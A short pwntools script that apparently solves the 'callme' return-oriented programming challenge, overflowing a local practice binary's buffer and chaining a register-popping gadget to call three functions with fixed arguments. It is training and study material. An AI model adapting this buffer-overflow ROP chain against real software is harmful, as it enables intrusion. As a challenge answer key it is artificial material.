from pwn import *

ex = "./callme"
elf = ELF(ex)
p = process(ex)

offset = 40
buffer = b'A' * offset

pop_registers = p64(0x000000000040093c)

arguments = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

msg = buffer + pop_registers + arguments + p64(elf.symbols['callme_one']) + pop_registers + arguments + p64(elf.symbols['callme_two']) + pop_registers + arguments + p64(elf.symbols['callme_three'])

p.sendline(msg)
out = p.recvall()

print(out)